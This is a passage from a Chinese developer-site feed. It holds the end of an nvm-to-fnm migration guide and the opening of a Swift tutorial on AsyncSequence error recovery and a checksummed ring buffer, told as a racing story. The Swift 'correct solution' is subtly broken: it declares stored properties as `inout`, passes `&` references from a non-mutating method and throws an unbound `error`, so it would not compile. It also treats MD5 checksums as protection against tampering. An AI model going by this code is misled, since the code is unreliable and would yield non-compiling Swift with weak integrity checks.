<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --corepack-enabled)</span>"</span>
</code></pre>
<h4 data-id="heading-32">3. 自定义安装目录</h4>
<p>默认安装在 <code>~/.local/share/fnm</code>，可以自定义：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> FNM_DIR=<span class="hljs-string">"/path/to/custom/fnm"</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd)</span>"</span>
</code></pre>
<h4 data-id="heading-33">4. 使用国内镜像加速</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 临时使用</span>
fnm install 20 --node-dist-mirror=https://npmmirror.com/mirrors/node

<span class="hljs-comment"># 永久配置</span>
<span class="hljs-built_in">export</span> FNM_NODE_DIST_MIRROR=<span class="hljs-string">"https://npmmirror.com/mirrors/node"</span>
</code></pre>
<h4 data-id="heading-34">5. 在脚本中使用 fnm</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 确保 fnm 环境已加载</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env)</span>"</span>

<span class="hljs-comment"># 使用指定版本执行</span>
fnm use 20
node your-script.js

<span class="hljs-comment"># 或者用 exec</span>
fnm <span class="hljs-built_in">exec</span> --using=20 node your-script.js
</code></pre>
<h3 data-id="heading-35">常见问题 FAQ</h3>
<h4 data-id="heading-36">Q: fnm 安装的 Node 在哪里？</h4>
<pre><code class="hljs language-bash" lang="bash">~/.local/share/fnm/node-versions/
</code></pre>
<p>每个版本是一个独立目录，结构清晰。</p>
<h4 data-id="heading-37">Q: 为什么 <code>which node</code> 显示的路径很奇怪？</h4>
<p>fnm 使用"多 Shell"机制，每个 Shell 会话有独立的 PATH：</p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">which</span> node
/Users/xxx/.local/state/fnm_multishells/12345_1234567890/bin/node
</code></pre>
<p>这是正常的，确保了不同终端窗口可以使用不同版本。</p>
<h4 data-id="heading-38">Q: 如何在 VS Code 中使用 fnm 管理的 Node？</h4>
<p>VS Code 会自动检测 fnm。如果遇到问题，可以在 <code>settings.json</code> 中配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"terminal.integrated.env.osx"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"PATH"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"${env:PATH}"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>或者在项目根目录创建 <code>.vscode/settings.json</code>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"eslint.runtime"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-39">Q: fnm 支持 .nvmrc 吗？</h4>
<p>完全支持！fnm 会按以下顺序查找版本文件：</p>
<ol>
<li><code>.node-version</code></li>
<li><code>.nvmrc</code></li>
<li><code>package.json</code> 的 <code>engines.node</code> 字段</li>
</ol>
<h4 data-id="heading-40">Q: 如何回退到 nvm？</h4>
<p>如果你想回退（虽然我不建议），只需：</p>
<ol>
<li>注释掉 fnm 配置</li>
<li>取消注释 nvm 配置</li>
<li>重新加载 Shell</li>
</ol>
<p>你的 nvm 数据（如果没删）还在 <code>~/.nvm</code>。</p>
<h3 data-id="heading-41">总结：值得迁移吗？</h3>
<p><strong>绝对值得。</strong></p>
<p>迁移成本：</p>
<ul>
<li>时间：约 15-30 分钟</li>
<li>学习曲线：几乎为零（命令高度相似）</li>
<li>风险：极低（可随时回退）</li>
</ul>
<p>获得收益：</p>
<ul>
<li>终端启动快 5-10 倍</li>
<li>版本切换快 20-30 倍</li>
<li>自动切换版本，告别手动 <code>nvm use</code></li>
<li>跨平台一致性，团队协作更顺畅</li>
<li>更少的 Bug 和怪异行为</li>
</ul>
<p>如果你每天要打开几十次终端、在多个项目间切换，fnm 节省的时间累积起来是非常可观的。更重要的是，那种<strong>丝滑无感</strong>的体验，会让你的开发心情都变好。</p>
<hr/>
<p><strong>参考资料：</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSchniz%2Ffnm" target="_blank" title="https://github.com/Schniz/fnm" ref="nofollow noopener noreferrer">fnm GitHub 仓库</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fen%2Fabout%2Freleases%2F" target="_blank" title="https://nodejs.org/en/about/releases/" ref="nofollow noopener noreferrer">Node.js 发布计划</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSchniz%2Ffnm%23performance" target="_blank" title="https://github.com/Schniz/fnm#performance" ref="nofollow noopener noreferrer">nvm vs fnm 性能对比</a></li>
</ul>
<hr/>
<p><em>如果这篇文章对你有帮助，欢迎点赞收藏。有问题可以在评论区交流！</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Swift 迭代三巨头（下集）：Sequence、Collection 与 Iterator 深度狂飙]]></title>    <link>https://juejin.cn/post/7581888578507751451</link>    <guid>https://juejin.cn/post/7581888578507751451</guid>    <pubDate>2025-12-10T02:12:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507751451" data-draft-id="7581702285564297266" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Swift 迭代三巨头（下集）：Sequence、Collection 与 Iterator 深度狂飙"/> <meta itemprop="keywords" content="Swift,Apple,编程语言"/> <meta itemprop="datePublished" content="2025-12-10T02:12:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大熊猫侯佩"/> <meta itemprop="url" content="https://juejin.cn/user/4292907536222152"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Swift 迭代三巨头（下集）：Sequence、Collection 与 Iterator 深度狂飙
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4292907536222152/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大熊猫侯佩
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:12:24.000Z" title="Wed Dec 10 2025 02:12:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/577f8a07372742659bd5737aa4f02997~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=jM0rkEV7s4NH8z%2FvXiZOnHvx9Vc%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-0">🛡️ 第一重防线：破解 AsyncSequence 的错误恢复漏洞</h2>
<p>异步序列的 “错误恢复漏洞”，本质是没搞懂<code>AsyncSequence</code>的错误传播规则 —— 就像 F1 赛车的刹车系统没校准，一踩就抱死，一松就失控。</p>
<p>当<code>next()</code>抛出错误时，默认会直接终止迭代，可如果粗暴重试，又会导致 “重复接收元素”；如果不重试，又会丢失关键数据。</p>
<p><strong>在本堂F1调教课中，您将学到如下内容：</strong></p>
<ul>
<li>🛡️ 第一重防线：破解 AsyncSequence 的错误恢复漏洞</li>
<li>错误传播的 “底层逻辑”</li>
<li>精准重试：给迭代器加 “记忆功能”</li>
<li>实战效果：再也不重复，再也不丢失</li>
<li>🛡️ 第二重防线：给 SafeRingBuffer 加 “数据校验锁”</li>
<li>校验逻辑：哈希值是 “数据身份证”</li>
<li>升级后的 SafeRingBuffer（核心校验代码）</li>
<li>效果：“迭代异常兽” 的篡改彻底失效</li>
<li>🏆 终局：组合拳粉碎 “迭代异常兽”</li>
<li>完整流程代码（终局方案）</li>
<li>剧情收尾：赛道恢复平静，迭代真相揭晓</li>
<li>📝 终极总结：Swift 迭代的 “黄金法则”</li>
</ul>
<p>艾拉和杰西要做的，就是找到 “精准重试” 的平衡点。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b86b2f8effd34873ad9199535972bebe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=2LViD3R92VzlLvqpyiZg3ArWb3Y%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-1">错误传播的 “底层逻辑”</h3>
<p>先搞懂一个关键：<code>AsyncSequence</code>的错误是 “终止性的”—— 一旦<code>next()</code>抛出错误，整个迭代就会停止，就像赛车引擎爆缸后再也没法前进。比如传感器断连抛出<code>SensorDisconnectError</code>，<code>for try await</code>循环会立刻跳出，进入<code>catch</code>块，后续的元素再也接收不到。</p>
<p>看这个 “踩坑示例”：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 错误示范：粗暴重试导致重复数据</span>
<span class="hljs-type">Task</span> {
    <span class="hljs-keyword">do</span> {
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> data <span class="hljs-keyword">in</span> <span class="hljs-type">SensorSequence</span>() {
            sensorBuffer.enqueue(data)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"接收数据：<span class="hljs-subst">\(data)</span>"</span>)
        }
    } <span class="hljs-keyword">catch</span> <span class="hljs-keyword">is</span> <span class="hljs-type">SensorDisconnectError</span> {
        <span class="hljs-comment">// 断连后直接重试，却没记录“已接收的元素ID”</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"传感器断连，重试中..."</span>)
        <span class="hljs-keyword">await</span> retrySensorSequence() <span class="hljs-comment">// 重试时会重新接收之前已处理的元素</span>
    }
}
</code></pre>
<p>这段代码的问题在于：重试时会生成<strong>全新的异步迭代器</strong>，它不知道之前已经接收过哪些元素，导致 “旧数据重复入队”—— 这正是 “迭代异常兽” 想要的结果。</p>
<h3 data-id="heading-2">精准重试：给迭代器加 “记忆功能”</h3>
<p>杰西的解决方案是：自定义一个<code>RetryableSensorSequence</code>，给异步迭代器加 “元素 ID 记忆”，重试时跳过已处理的元素，就像赛车在维修后重回赛道，能精准接上之前的位置继续跑。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3dc9140ed6545848f14851214cf4eb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=65BrhpIa8atU9GsAHYH4duaVhFM%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 带“记忆功能”的可重试异步序列</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">RetryableSensorSequence</span>: <span class="hljs-title class_">AsyncSequence</span> {
    <span class="hljs-keyword">typealias</span> <span class="hljs-type">Element</span> <span class="hljs-operator">=</span> <span class="hljs-type">SensorData</span> <span class="hljs-comment">// 传感器数据（含唯一ID和校验码）</span>
    <span class="hljs-keyword">typealias</span> <span class="hljs-type">AsyncIterator</span> <span class="hljs-operator">=</span> <span class="hljs-type">RetryableSensorIterator</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> baseSequence: <span class="hljs-type">SensorSequence</span> <span class="hljs-comment">// 原始传感器序列</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> processedIDs: <span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-operator">=</span> [] <span class="hljs-comment">// 记录已处理的元素ID（防重复）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> maxRetries: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span> <span class="hljs-comment">// 最大重试次数（避免无限循环）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> currentRetry: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <span class="hljs-comment">// 当前重试次数</span>

    <span class="hljs-keyword">init</span>(<span class="hljs-params">baseSequence</span>: <span class="hljs-type">SensorSequence</span>) {
        <span class="hljs-keyword">self</span>.baseSequence <span class="hljs-operator">=</span> baseSequence
    }

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">makeAsyncIterator</span>() -&gt; <span class="hljs-type">RetryableSensorIterator</span> {
        <span class="hljs-type">RetryableSensorIterator</span>(
            baseIterator: baseSequence.makeAsyncIterator(),
            processedIDs: <span class="hljs-operator">&amp;</span>processedIDs,
            maxRetries: maxRetries,
            currentRetry: <span class="hljs-operator">&amp;</span>currentRetry
        )
    }

    <span class="hljs-comment">// 带记忆功能的异步迭代器</span>
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">RetryableSensorIterator</span>: <span class="hljs-title class_">AsyncIteratorProtocol</span> {
        <span class="hljs-keyword">typealias</span> <span class="hljs-type">Element</span> <span class="hljs-operator">=</span> <span class="hljs-type">SensorData</span>
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> baseIterator: <span class="hljs-type">SensorSequence</span>.<span class="hljs-type">AsyncIterator</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> processedIDs: <span class="hljs-keyword">inout</span> <span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-comment">// 引用外部的已处理ID集合</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> maxRetries: <span class="hljs-type">Int</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> currentRetry: <span class="hljs-keyword">inout</span> <span class="hljs-type">Int</span>

        <span class="hljs-keyword">mutating</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">next</span>() <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">SensorData</span>? {
            <span class="hljs-keyword">do</span> {
                <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> baseIterator.next() <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> <span class="hljs-comment">// 序列正常结束</span>
                }
                <span class="hljs-comment">// 关键：检查元素ID是否已处理，避免重复</span>
                <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>processedIDs.contains(data.id) <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> next() <span class="hljs-comment">// 跳过重复元素，继续获取下一个</span>
                }
                processedIDs.insert(data.id) <span class="hljs-comment">// 记录已处理的ID</span>
                <span class="hljs-keyword">return</span> data
            } <span class="hljs-keyword">catch</span> <span class="hljs-keyword">is</span> <span class="hljs-type">SensorDisconnectError</span> {
                <span class="hljs-comment">// 达到最大重试次数，抛出最终错误</span>
                <span class="hljs-keyword">guard</span> currentRetry <span class="hljs-operator">&lt;</span> maxRetries <span class="hljs-keyword">else</span> {
                    currentRetry <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <span class="hljs-comment">// 重置重试次数，方便后续复用</span>
                    <span class="hljs-keyword">throw</span> error <span class="hljs-comment">// 重试失败，终止迭代</span>
                }
                currentRetry <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"第<span class="hljs-subst">\(currentRetry)</span>次重试传感器连接..."</span>)
                <span class="hljs-comment">// 重建基础迭代器（重新连接传感器）</span>
                <span class="hljs-keyword">self</span>.baseIterator <span class="hljs-operator">=</span> <span class="hljs-type">SensorSequence</span>().makeAsyncIterator()
                <span class="hljs-comment">// 递归调用next()，继续迭代（不重复已处理元素）</span>
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> next()
            } <span class="hljs-keyword">catch</span> {
                <span class="hljs-comment">// 其他错误（比如数据格式错误），直接抛出</span>
                <span class="hljs-keyword">throw</span> error
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-3">实战效果：再也不重复，再也不丢失</h3>
<p>艾拉把这个 “带记忆的序列” 集成到系统后，效果立竿见影：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 正确姿势：用可重试序列消费传感器数据</span>
<span class="hljs-type">Task</span> {
    <span class="hljs-keyword">do</span> {
        <span class="hljs-keyword">let</span> retryableSequence <span class="hljs-operator">=</span> <span class="hljs-type">RetryableSensorSequence</span>(baseSequence: <span class="hljs-type">SensorSequence</span>())
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> data <span class="hljs-keyword">in</span> retryableSequence {
            sensorBuffer.enqueue(data)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"安全接收数据：<span class="hljs-subst">\(data)</span>（ID：<span class="hljs-subst">\(data.id)</span>）"</span>)
        }
    } <span class="hljs-keyword">catch</span> {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"最终失败：<span class="hljs-subst">\(error)</span>，已触发备用传感器"</span>)
    }
}
</code></pre>
<p>当传感器断连时，序列会自动重试（最多 3 次），且重试后绝不会重复接收旧数据 —— 因为<code>processedIDs</code>会牢牢记住 “哪些数据已经处理过”。就像赛车在维修区快速换胎后，能精准回到赛道的正确位置，既不落后，也不跑偏。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/832ed2ad1566491297ab477c29983d1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=1rZ4a90yK9%2Bz7N2hjzG%2FADLT8LE%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-4">🛡️ 第二重防线：给 SafeRingBuffer 加 “数据校验锁”</h2>
<p>解决了重复问题，下一个目标是 “数据篡改”——“迭代异常兽” 会修改传感器数据的校验码，让错误数据混入缓冲区。杰西的方案是：给<code>SafeRingBuffer</code>升级，在 “入队” 和 “访问” 时双重校验数据完整性，就像给赛车装 “指纹锁”，不是自己人的数据，一概不让进。</p>
<h3 data-id="heading-5">校验逻辑：哈希值是 “数据身份证”</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5cc302dcd644aebbf01a7376a295f3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=TbpPs%2FVomi9llBioH%2FeZaaiRBBM%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>传感器数据会自带一个<code>checksum</code>（哈希值），计算规则是 “数据内容 + 时间戳” 的 MD5 值。<code>SafeRingBuffer</code>在入队时要验证这个哈希值，不匹配就拒绝入队；在访问时再二次校验，确保数据没被篡改。</p>
<h4 data-id="heading-6">升级后的 SafeRingBuffer（核心校验代码）</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SafeRingBuffer</span>&lt;<span class="hljs-title class_">Element</span>: <span class="hljs-title class_">DataVerifiable</span>&gt;: <span class="hljs-title class_">Collection</span> {
    <span class="hljs-comment">// 新增约束：Element必须遵守DataVerifiable协议（有校验能力）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> storage: [<span class="hljs-type">Element</span>?]
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> head <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> tail <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> lock <span class="hljs-operator">=</span> <span class="hljs-type">NSLock</span>()

    <span class="hljs-comment">// 入队时校验：篡改的数据直接拒之门外</span>
    <span class="hljs-keyword">mutating</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">enqueue</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">element</span>: <span class="hljs-type">Element</span>) <span class="hljs-keyword">throws</span> {
        lock.lock()
        <span class="hljs-keyword">defer</span> { lock.unlock() }

        <span class="hljs-comment">// 关键：验证数据哈希值，不匹配则抛出“数据篡改错误”</span>
        <span class="hljs-keyword">guard</span> element.verifyChecksum() <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-type">DataTamperingError</span>.invalidChecksum(
                <span class="hljs-string">"数据校验失败，ID：<span class="hljs-subst">\(element.id)</span>，可能被篡改"</span>
            )
        }

        storage[tail] <span class="hljs-operator">=</span> element
        tail <span class="hljs-operator">=</span> (tail <span class="hljs-operator">+</span> <span class="hljs-number">1</span>) <span class="hljs-operator">%</span> storage.count

        <span class="hljs-keyword">if</span> count <span class="hljs-operator">==</span> storage.count {
            head <span class="hljs-operator">=</span> (head <span class="hljs-operator">+</span> <span class="hljs-number">1</span>) <span class="hljs-operator">%</span> storage.count
        } <span class="hljs-keyword">else</span> {
            count <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
        }
    }

    <span class="hljs-comment">// 下标访问时二次校验：防止缓冲区内部数据被篡改</span>
    <span class="hljs-keyword">subscript</span>(<span class="hljs-params">position</span>: <span class="hljs-type">Index</span>) -&gt; <span class="hljs-type">Element</span> {
        lock.lock()
        <span class="hljs-keyword">defer</span> { lock.unlock() }

        <span class="hljs-built_in">precondition</span>((<span class="hljs-number">0</span><span class="hljs-operator">..&lt;</span>count).contains(position), <span class="hljs-string">"索引超出范围"</span>)
        <span class="hljs-keyword">let</span> actualPosition <span class="hljs-operator">=</span> (head <span class="hljs-operator">+</span> position) <span class="hljs-operator">%</span> storage.count
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> element <span class="hljs-operator">=</span> storage[actualPosition] <span class="hljs-keyword">else</span> {
            <span class="hljs-built_in">preconditionFailure</span>(<span class="hljs-string">"缓冲区数据丢失，位置：<span class="hljs-subst">\(actualPosition)</span>"</span>)
        }

        <span class="hljs-comment">// 二次校验：确保数据在缓冲区中没被篡改</span>
        <span class="hljs-built_in">precondition</span>(element.verifyChecksum(), <span class="hljs-string">"缓冲区数据被篡改，ID：<span class="hljs-subst">\(element.id)</span>"</span>)
        <span class="hljs-keyword">return</span> element
    }
}

<span class="hljs-comment">// 数据校验协议：所有需要校验的数据都要遵守</span>
<span class="hljs-keyword">protocol</span> <span class="hljs-title class_">DataVerifiable</span> {
    <span class="hljs-keyword">var</span> id: <span class="hljs-type">String</span> { <span class="hljs-keyword">get</span> } <span class="hljs-comment">// 唯一ID</span>
    <span class="hljs-keyword">var</span> checksum: <span class="hljs-type">String</span> { <span class="hljs-keyword">get</span> } <span class="hljs-comment">// 数据哈希值</span>
    <span class="hljs-comment">// 校验方法：计算当前数据的哈希值，和自带的checksum对比</span>
